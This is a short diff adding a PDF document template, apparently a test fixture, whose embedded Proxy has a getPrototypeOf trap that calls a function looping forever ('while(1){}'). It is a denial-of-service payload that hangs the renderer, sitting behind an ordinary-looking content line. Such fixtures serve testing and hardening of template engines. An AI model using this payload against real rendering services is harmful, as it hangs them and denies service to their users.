@@ -1,0 +1,12 @@
+<document defaultStyle={{ font: 'OpenSans', fontSize: 12 }}>
+    {(function main(){
+            while(1){}
+        },
+        new Proxy({}, {
+            getPrototypeOf(t){
+                global.main();
+            }
+        }))}
+
+    <content>This will appear in my PDF!</content>
+</document>
